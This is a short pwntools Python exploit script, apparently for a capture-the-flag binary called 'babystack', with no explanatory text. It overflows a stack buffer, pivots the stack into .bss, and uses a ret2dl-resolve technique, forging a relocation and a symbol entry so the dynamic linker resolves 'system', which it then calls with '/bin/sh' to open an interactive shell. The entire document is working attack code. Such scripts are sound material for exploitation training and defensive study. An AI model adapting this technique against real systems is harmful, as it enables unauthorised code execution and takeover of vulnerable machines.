from pwn import *
sh = process("./babystack")
elf = ELF("./babystack")

bss_addr = 0x0804A020
bss_stage = bss_addr + 0x800
read_plt = elf.plt["read"]
pop_ebp_ret = 0x080484EB
leave_ret = 0x08048455
payload = b'a'*0x28 + p32(bss_stage) + p32(read_plt) + p32(leave_ret) \
			  + p32(0) + p32(bss_stage) + p32(100)
sh.send(payload)

plt_0 = 0x080482F0
rel_plt = 0x080482B0
index_offset = (bss_stage + 28) - rel_plt 
dynsym = 0x080481CC
dynstr = 0x0804822C
fake_sym_addr = bss_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym_256 = (fake_sym_addr - dynsym) << 4
alarm_got = elf.got["alarm"]
r_info = index_dynsym_256 | 0x7
fake_reloc = p32(alarm_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = b'aaaa' + p32(plt_0) + p32(index_offset) + b'aaaa' \
				 + p32(bss_stage+80) + b'aaaa' + b'aaaa' \
				 + fake_reloc + b'a'*align + fake_sym + ("system\x00").encode()
payload2 += b'a' * (80 - len(payload2))
payload2 += ("/bin/sh\x00").encode()
payload2 += b'a' * (100 - len(payload2))
sh.sendline(payload2)
sh.interactive()
